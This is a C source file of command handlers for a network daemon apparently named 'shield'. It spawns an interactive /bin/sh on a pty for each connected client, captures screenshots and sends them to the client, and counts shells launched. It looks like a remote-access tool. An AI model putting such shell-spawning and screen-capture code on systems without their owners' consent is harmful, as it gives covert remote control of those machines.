#ifdef _GNU_SOURCE
#undef _GNU_SOURCE
#endif // _GNU_SOURCE

#define _GNU_SOURCE

#include <termios.h>
#include <pty.h>
#include <unistd.h>
#include <fcntl.h>

#include <shield/server.h>
#include <shield/qio.h>

#include "cmds/screenshot.inc.cc"

int shield_cmd_help(client_t *client, [[maybe_unused]] daemon_server_t *server, kr_strview_t *cmdline)
{
	(void) client, (void) server, (void) cmdline;
	//TODO: remake in C
	// if (!args || !*args)
	// {
	// 	for (int i = 0; commands[i].command != NULL; ++i)
	// 	{
	// 		client->output_buffer.append(commands[i].usage);
	// 		client->output_buffer.append(": ");
	// 		client->output_buffer.append(commands[i].description);
	// 		client->output_buffer.push_back('\n');
	// 	}
	// 	return (0);
	// }
	//
	// std::string option;
	// std::istringstream argstream(args);
	// argstream >> option;
	// for (int i = 0; commands[i].command != NULL; ++i)
	// {
	// 	if (option == commands[i].command)
	// 	{
	// 		client->output_buffer.append("Usage: ");
	// 		client->output_buffer.append(commands[i].usage);
	// 		client->output_buffer.push_back('\n');
	//
	// 		client->output_buffer.append("Description: ");
	// 		client->output_buffer.append(commands[i].description);
	// 		client->output_buffer.push_back('\n');
	//
	// 		return 0;
	// 	}
	// }
	//
	// client->output_buffer.append("Command not found: ");
	// client->output_buffer.append(option);
	// client->output_buffer.push_back('\n');

	return (-1);
}

// Summon a shell for the client
int	shield_cmd_shell(client_t *client, daemon_server_t *server, kr_strview_t *cmdline)
{
	(void) cmdline; // unused parameter
	int master_fd, pid;

	DEBUG("Spawning shell for client %d\n", client->index);
	qio_data.shells_launched++;

	struct termios tios;
	tcgetattr(STDIN_FILENO, &tios);
	tios.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL);

	pid = forkpty(&master_fd, NULL, &tios, NULL);

	if (pid < 0)	//Error
		return (1);
	if (pid == 0)
	{
		char *argv[] = {(char *)"sh", NULL};
		char *envp[] = {NULL};
		execve("/bin/sh", argv, envp);

		DEBUG("execve failed");
		exit(1);
	}

	if (fcntl(master_fd, F_SETFL, O_NONBLOCK) < -1)
	{
		DEBUG("fcntl on pty failed");
		close(master_fd);
		return (1);
	}

	DEBUG("finding slot for pty fd in pollfd array\n");
	for (size_t j = 0; j < MAX_FD; j++)
	{
		DEBUG("pollfd slot %zu: type %d\n", j, server->poll_metadata[j].fd_type);
		if (server->poll_metadata[j].fd_type == FD_UNUSED)
		{
			DEBUG("Linking pty fd %d to client %d\n", master_fd, client->index);
			server->pollfd_array[j].fd = master_fd;
			server->pollfd_array[j].events |= POLLIN | POLLHUP;
			server->poll_metadata[j].client_index = client->index;
			server->poll_metadata[j].fd_type = FD_CLIENT_PTY;
			break;
		}
	}
	client->pty_fd = master_fd;
	return (0);
}

int	shield_cmd_screenshot(
	[[maybe_unused]] client_t *client,
	[[maybe_unused]] daemon_server_t *server,
	[[maybe_unused]] kr_strview_t *cmdline
) {
	(void) client, (void) server, (void) cmdline;
	const char *result = shield_screenshot();
	kr_strappend(&client->out_buffer, result + 6);
	kr_strappend(&client->out_buffer, "\n");
	return (0);
}

int	shield_cmd_get(client_t *client, daemon_server_t *server, kr_strview_t *cmdline)
{
	(void) client; // unused parameter
	(void) server; // unused parameter
	(void) cmdline; // unused parameter
	return (0);
}

int	shield_cmd_put(client_t *client, daemon_server_t *server, kr_strview_t *cmdline)
{
	(void) client; // unused parameter
	(void) server; // unused parameter
	(void) cmdline; // unused parameter
	return (0);
}

int	shield_cmd_stats(client_t *client, daemon_server_t *server, unused kr_strview_t *cmdline)
{
	char buffer[32];

	kr_strappend(&client->out_buffer, "===== Server Statistics =====\n");
#define APPEND_STAT(name, value) \
	kr_strappend(&client->out_buffer, name ": "); \
	snprintf(buffer, sizeof(buffer), "%lu\n", value); \
	kr_strappend(&client->out_buffer, buffer);

	APPEND_STAT("Current active connections", (uint64_t)server->current_conn);
	APPEND_STAT("Total shells launched", qio_data.shells_launched);
	APPEND_STAT("Total bytes received", qio_data.bytes_received);
	APPEND_STAT("Total bytes sent", qio_data.bytes_sent);
	APPEND_STAT("Total connections", qio_data.total_connections);
#undef APPEND_STAT
	return (0);
}

int	shield_cmd_exit(client_t *client, unused daemon_server_t *server, unused kr_strview_t *cmdline)
{
	kr_strappend(&client->out_buffer, "Goodbye!\n");
	client->state = CLIENT_DISCONNECTED;
	return (0);
}
